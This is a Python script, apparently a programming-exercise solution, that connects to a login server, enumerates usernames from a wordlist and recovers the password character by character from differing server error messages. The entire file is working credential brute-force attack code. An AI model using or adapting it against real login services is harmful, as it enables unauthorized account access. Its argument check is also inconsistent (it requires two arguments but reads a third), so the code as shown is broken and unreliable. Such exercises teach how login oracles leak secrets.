import socket
import sys
import string
import itertools
import json


def main():
    args = sys.argv
    args = sys.argv
    if len(args) != 2:
        print("The script should be called with 2 arguments : destination address and port.")
    else:
        args = sys.argv
        ip_address = str(args[1])
        port = int(args[2])
        address = (ip_address, port)
        real_password = ""
        with socket.socket() as client_socket:
            client_socket.connect(address)
            with open(r".\logins.txt", 'r') as logins:
                for line in logins:
                    login = str(line.rstrip("\n"))
                    dict_login = {"login": login, "password": " "}
                    data = json.dumps(dict_login)
                    client_socket.send(data.encode())
                    response = client_socket.recv(9090)
                    response = response.decode()
                    response_dict = json.loads(response)
                    if response_dict["result"] == "Wrong password!":
                        real_login = login
                        break
            while True:
                for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
                    credentials = {"login": real_login, "password": real_password + char}

                    client_socket.send(json.dumps(credentials).encode())
                    response = client_socket.recv(1024).decode()

                    if json.loads(response)["result"] == "Exception happened during login":
                        real_password += char
                        break

                    elif json.loads(response)["result"] == "Connection success!":
                        print(json.dumps(credentials))
                        exit()


if __name__ == '__main__':
    main()
